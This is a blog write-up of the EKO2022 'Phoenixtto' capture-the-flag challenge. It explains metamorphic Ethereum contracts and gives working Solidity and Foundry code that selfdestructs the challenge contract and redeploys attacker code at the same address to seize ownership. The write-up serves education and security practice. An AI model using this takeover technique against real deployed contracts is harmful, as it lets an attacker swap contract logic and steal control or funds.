---
title: 'EKO2022 Enter the metaverse CTF Challenge 1 — Phoenixtto'
excerpt: EKO2022 Enter the metaverse is a collection of challenges made for the EKOparty 2022 submited by some gigabrain hackers</br></br>Our goal is to be able to capture this strange monster called Phoenixtto.
coverImage:
  url: '/assets/blog/eko2022.jpg'
  credit:
    name: EKO2022 Enter the metaverse
    url: https://www.ctfprotocol.com/tracks/eko2022
date: '2023-02-19T18:00:00.000Z'
author:
  name: Emanuele Ricci
  twitter: StErMi
  picture: '/assets/blog/authors/stermi.jpeg'
ogImage:
  url: '/assets/blog/eko2022.jpg'
---

This is Part 1 of the series "Let's play EKO2022 Enter the metaverse CTF"

[EKO2022 Enter the metaverse](https://www.ctfprotocol.com/tracks/eko2022) is a collection of challenges made for the [EKOparty](https://www.ekoparty.org/) 2022 submited by some gigabrain hackers; [@Br0niclΞ](https://twitter.com/Cryptonicle1), [@nicobevi.eth](https://twitter.com/nicobevi_eth), [@matta](https://twitter.com/mattaereal), [@tinchoabbate](https://twitter.com/tinchoabbate), [@adriro](https://twitter.com/adrianromero), [@bengalaQ](https://twitter.com/AugustitoQ), [@chiin](https://linktr.ee/chiin.eth), [@Rotciv](https://twitter.com/victor93389091), [@Bahurum](https://twitter.com/bahurum) and [@0x4non](https://twitter.com/eugenioclrc).

This is a simple experiment of the **Proof of Hack Protocol**. Its a mix between classical blockchain challenges, and new ones, its permissionless, this page will curated some of them.  
After you break each challenge you can claim a souldbond NFT on polygon.

## Challenge #1  —  Phoenixtto

> Within the world of crossovers there is a special one, where the universes of pokemon, harry potter and solidity intertwine. In this crossover a mixed creature is created between dumbledore's phoenix, a wild ditto and since we are in the solidity universe this creature is a contract. We have called it Phoenixtto and it has two important abilities, that of being reborn from it's ashes after its destruction and that of copying the behavior of another bytecode.
>
> Try to capture the Phoenixtto, if you can...
>
> Challenge url: [Phoenixtto](https://www.ctfprotocol.com/tracks/eko2022/phoenixtto)
> Challenge author: [Rotciv](https://twitter.com/victor93389091)

## The attacker end goal

Our goal is to be able to capture this strange monster called Phoenixtto, a mix between a phoenix and Ditto itself.

## Study the contracts

After reading very close the source code of the contracts and solving the CTF, I realized that the description of the challenge have some important hints that would have made my life much easier from the beginning.

Another huge pain was being able to reproduce the test locally via [Foundry](https://github.com/foundry-rs/foundry), but you will understand why when I'll show you the code.

The important hints that you need to catch (no pun intended 😅) from the description of the challenge are:

- Phoenixtto can **reborn** from its ashes after its destruction
- Phoenixtto can **copy** the behavior of another bytecode

Do these hints ring any bell to you?

## Factory Contract

This part is not relevant to find the exploit, but it's important to understand

- What has been deployed
- Which parameters
- What contracts could we interact with?
- What the challenge, check to see if we have solved it

### Deployment

By looking at the `ChallengePhoenixttoFactory` we see that the `deploy` function just takes the `_player` address and return the `Laboratory` instance as the only value we can directly manipulate

```solidity
function deploy(address _player) external payable override returns (address[] memory ret) {
    require(msg.value == 0, "dont send ether");
    address _challenge = address(new Laboratory(_player));
    Laboratory(_challenge).mergePhoenixDitto();
    ret = new address[](1);
    ret[0] = _challenge;
}
```

### Completion checks

In the `isComplete` function of the factory, it checks that the `Phoenixtto` has been caught by the `player`

```solidity
function isComplete(address[] calldata _challenges) external view override returns (bool) {
    Laboratory _target = Laboratory(_challenges[0]);

    return _target.isCaught();
}
```

## `Phoenixtto.sol`

This is the monster contract. There's no `constructor` function, but there are two state variables

- `address public owner` that should contain who owns the monster
- `bool private _isBorn` that is an internal boolean flag that is used by the contract's logic

### `reBorn`

It's an external function that implements the reborn logic. If the monster is alive (has already reborned) it just returns. Otherwise, set the `_isReborn` flag to `true` and the `owner` to `address(this)` (the monster itself).

This mean that after that the monster is reborn, it has no owner (it's free). This function is just `external` so anyone can call it, but if the monster is already alive, it will just return as soon as possible.

```solidity
function reBorn() external {
    if (_isBorn) return;

    _isBorn = true;
    owner = address(this);
}
```

### `capture`

This function is the one we must call to be able to capture the monster and complete the challenge.

```solidity
function capture(string memory _newOwner) external {
    if (!_isBorn || msg.sender != tx.origin) return;

    address newOwner = address(uint160(uint256(keccak256(abi.encodePacked(_newOwner)))));
    if (newOwner == msg.sender) {
        owner = newOwner;
    } else {
        selfdestruct(payable(msg.sender));
        _isBorn = false;
    }
}
```

The first part checks that the monster is alive and that the contract is called directly by an EOA (externally owned account) and not a contract.

The second part of the contract seems complicated, but what does this part of the code really do?

`address newOwner = address(uint160(uint256(keccak256(abi.encodePacked(_newOwner)))));`

An Ethereum account is made up by a public key and a private key. The **address** of an account is just the less significant 20 bytes of the hash of the public key of an account. This code is just converting your public key to the address associated to the public key.

If they match (you have passed the correct public key) the `msg.sender` will become the new owner; otherwise the contract will `selfdestruct` and set the `_isBorn` flag to false.

So one solution to complete the challenge would be to just call `capture` with the player's public key and capture the monster. But this is the easy way to do it, and we want to deep dive more into the code if there's another way to complete the challenge.

## `Laboratory.sol`

This is the contract we are going to interact with, at first, it will seem very complicated but at some point you'll have the "click moment" where everything become clean!

The contract has three state variables

- `address immutable PLAYER` the player's address initialized during the `constructor`
- `address public getImplementation` an implementation address of some sort
- `address public addr` another address of some sort

### `isCaught`

This is the function that is called by the Factory to check if the challenge is completed.

```solidity
function isCaught() external view returns (bool) {
    return Phoenixtto(addr).owner() == PLAYER;
}
```

It just checks if the `Phoenixtto` contract stored at the address `addr` has the `owner` address equal to the `PLAYER` (our address). Our goal is to be able to become the owner of the `Phoenixtto` contract stored in that address.

### `mergePhoenixDitto`

This function is public, so anyone would be able to call it, and if you remember it's the function that is called by the `Factor` just after deploying the `Laboratory`.

```solidity
function mergePhoenixDitto() public {
    reBorn(type(Phoenixtto).creationCode);
}
```

It just internally call the `Laboratory.reBorn` passing the "source code" of the `Phoenixtto` contract.

### `reBorn`

Now it's time to deep dive into the complicated part. What does the `reBorn` function do? Let's see the code

```solidity
function reBorn(bytes memory _code) public {
    address x;
    assembly {
        x := create(0, add(0x20, _code), mload(_code))
    }
    getImplementation = x;

    _code = hex"5860208158601c335a63aaf10f428752fa158151803b80938091923cf3";
    assembly {
        x := create2(0, add(_code, 0x20), mload(_code), 0)
    }
    addr = x;
    Phoenixtto(x).reBorn();
}
```

The first thing that we notice is that the function does not have any restriction. Anyone could call it. Let's try to understand the first half. The function store in the `x` local variable the result of the execution of the `Yul` call to the `create` function. If we look at the Solidity docs, it does say

> `create(v, p, n)`
>
> create new contract with code `mem[p…(p+n))` and send `v` wei and return the new address; returns 0 on error

What is doing, is just deploying the contract with code `_code` and storing the address of the new contract inside the variable `x`.

`add(_code, 0x20)` read the **real** position in memory of `_code` (we are adding `0x20`, or 32 bytes, because in the first position we have the length of `_code`) and then we load the length of `_code` to be read from memory.

The result of the `create` OPCODE operation is the address of the new contract. The address is then stored in the state variable `getImplementation`.

An important thing to know is that the address of the deployed contract is deterministic: `keccak256(sender, nonce)`. The `sender` is the address of who's calling `create` and `nonce`. Both EOA and Smart Contracts have nonce, but they increase differently. For EAO they increment when it submits a transaction, for Smart Contract when it creates a new Contract via `create`.

The second part of the code instead of taking `_code` from the input is loading it from a hexadecimal string... odd... That must be some valid bytecode, otherwise the `create2` operation would fail, right? For the moment we won't bother with the content of the bytecode and let's keep going with the code.

This time the contract use `create2` instead of `create`. That's a different `OPCODE` that has been introduced with the [EIP-1014: Skinny CREATE2](https://eips.ethereum.org/EIPS/eip-1014) in 2018.

It does the same as `create` (deploying a contract) but there are two main differences:

1. it takes a new parameter called `salt`
2. the address of the deployed contract can be pre-determinated: `keccak256( 0xff ++ address ++ salt ++ keccak256(init_code))[12:]`

So the contract is created by executing the bytecode inside `5860208158601c335a63aaf10f428752fa158151803b80938091923cf3` and the address of the contract put inside the state variable `addr`. At the end it will call `Phoenixtto(x).reBorn()` that initialize the contract setting `_isBorn = true` and `owner` equal to address of the contract itself.

But what does that bytecode do when executed by the `create2`!?!? We could use [EVM Codes Playground](https://www.evm.codes/playground) to decode it and see what's going on...

```
[00]    PC
[01]    PUSH1   20
[03]    DUP2
[04]    PC
[05]    PUSH1   1c
[07]    CALLER
[08]    GAS
[09]    PUSH4   aaf10f42
[0e]    DUP8
[0f]    MSTORE
[10]    STATICCALL
[11]    ISZERO
[12]    DUP2
[13]    MLOAD
[14]    DUP1
[15]    EXTCODESIZE
[16]    DUP1
[17]    SWAP4
[18]    DUP1
[19]    SWAP2
[1a]    SWAP3
[1b]    EXTCODECOPY
[1c]    RETURN
```

If you would like to learn about the EVM and understand what this bytecode do when executed I suggest you to start reading some of these resources

- [Twitter thread about EVM learning made by me](https://twitter.com/StErMi/status/1534815734894694400)
- [The EVM Handbook](https://noxx3xxon.notion.site/noxx3xxon/The-EVM-Handbook-bb38e175cc404111a391907c4975426d)
- [Let's play EVM Puzzles](https://stermi.xyz/blog/lets-play-evm-puzzles)

Let's say that we don't have the knowledge to understand that bytecode. What would you do? To be honest, the first thing that I would do, is to just "google it". And the first result you would get from the search, it would be a link to [MetamorphicContractFactory.sol](https://github.com/0age/metamorphic/blob/master/contracts/MetamorphicContractFactory.sol).

Interesting... so that bytecode is something already known and used... And it's used for something about "Metamorphic Contracts"...

There are plenty of resources about Metamorphic Contracts and I highly recommend you to read all of them. Not only they are super useful, but it's really mind-blowing to understand how it works and how people create this rare diamonds with technology.

- [The Promise and the Peril of Metamorphic Contracts](https://0age.medium.com/the-promise-and-the-peril-of-metamorphic-contracts-9eb8b8413c5e) by 0age
- [Defend against “Wild Magic” in the next Ethereum upgrade](https://medium.com/@jason.carver/defend-against-wild-magic-in-the-next-ethereum-upgrade-b008247839d2) by Jason Carver
- [Metamorphic - A factory contract for creating metamorphic (i.e. redeployable) contracts](https://github.com/0age/metamorphic) by 0age
- [A Tool for Detecting Metamorphic Smart Contracts](https://a16zcrypto.com/metamorphic-smart-contract-detector-tool/) by Michael Blau from a16zcrypto

The idea behind this concept is to be able to change the code inside a contract and make it metamorph into something else. This leverage the fact that given the same inputs, the CREATE2 will always deploy the bytecode to the same address. One important thing to note is that the bytecode used is part of the parameters and part of the formula used to generate the address. So if it changes, the resulting address will change as a result.

All the magic is done by what's inside the deployed bytecode (that is always the same): `5860208158601c335a63aaf10f428752fa158151803b80938091923cf3`. In just a few words it will query the caller asking which is the address of the implementation contract to use as the source of the smart contract to be deployed.

By doing so, while the contract deployed is dynamic, the resulting address is always the same.

I think that we have enough information in our end to be able to complete the challenge.

## Solution code

After the `ChallengePhoenixttoFactory` deployed and initialized the challenge, we have access to the `Laboratory` and to both the `getImplementation` and `addr` state variables contained in the `Laboratory` contracts

- `getImplementation` is the address of the implementation contract that will be used as the code deployed into `addr` thanks to the metamorphic nature of it.
- `addr` is the address of the "final" `Phoenixtto` contract that will contain the implementation code of `getImplementation`

What we need to do is to

1. Destroy the current `Phoenixtto` contract to be able to re-deploy into the same address. This is required because otherwise the `create2` operation would fail... you cannot override an already existing contract.
2. Build a custom contract that at least contains a function to capture the monster and the `reBorn` function that is called by the `Laboratory` at the end of the execution of `Laboratory.reBorn(bytes memory _code)`
3. Use our own contract bytecode as the input of `Laboratory.reBorn`
4. Catch the monster
5. End the challenge!

Here's the code of our custom smart contract

```solidity
contract PhoenixttoMutated {
    address public owner;

    function reBorn() external {
        // we don't care about this part but we still need to expose it
        // otherwise Laboratory.reBorn would revert
    }

    function capture(string memory _newOwner) external {
        // do nothing
        owner = msg.sender;
    }
}
```

And here's the code to execute it to complete the challenge

```solidity
// What we need to do is to destroy the metamorphic contract
// And replace it with our own implementation

// Destroy the metamorphic contract
Phoenixtto metamorphic = Phoenixtto(laboratory.addr());
// we don't care what we pass here, it just needs to go into the `else` case
// and selfdestruct itself
// The `_isBorn` must be `true` and the caller must not be a contract or called via `call`
// because `msg.sender` must be equal to `tx.origin`
vm.prank(player, player);
metamorphic.capture("");

// Re-deploy the implementation that will replace the metamorphic contract code
// with our mutated vdersion of the Phoenixtto contract
laboratory.reBorn(type(PhoenixttoMutated).creationCode);

// now we can call our own implementation of the `capture` function that will use the code of
// PhoenixttoMutated.capture
vm.prank(player);
metamorphic.capture("");
```

You can read the full solution of the challenge opening [PhoenixttoTest.t.sol](https://github.com/StErMi/Proof-Of-Hack-Protocol-CTF/blob/main/test/PhoenixttoTest.t.sol).

## Further reading

- [EIP-1014: Skinny CREATE2](https://eips.ethereum.org/EIPS/eip-1014) by Vitalik Buterin
- [The Promise and the Peril of Metamorphic Contracts](https://0age.medium.com/the-promise-and-the-peril-of-metamorphic-contracts-9eb8b8413c5e) by 0age
- [Defend against “Wild Magic” in the next Ethereum upgrade](https://medium.com/@jason.carver/defend-against-wild-magic-in-the-next-ethereum-upgrade-b008247839d2) by Jason Carver
- [Metamorphic - A factory contract for creating metamorphic (i.e. redeployable) contracts](https://github.com/0age/metamorphic) by 0age
- [A Tool for Detecting Metamorphic Smart Contracts](https://a16zcrypto.com/metamorphic-smart-contract-detector-tool/) by Michael Blau from a16zcrypto

Some additional EVM related content that you should know

- [Twitter thread about EVM learning made by me](https://twitter.com/StErMi/status/1534815734894694400)
- [The EVM Handbook](https://noxx3xxon.notion.site/noxx3xxon/The-EVM-Handbook-bb38e175cc404111a391907c4975426d)
- [Let's play EVM Puzzles](https://stermi.xyz/blog/lets-play-evm-puzzles)

## Disclaimer

All Solidity code, practices and patterns in this repository are DAMN VULNERABLE and for educational purposes only.

I **do not give any warranties** and **will not be liable for any loss** incurred through any use of this codebase.

**DO NOT USE IN PRODUCTION**.
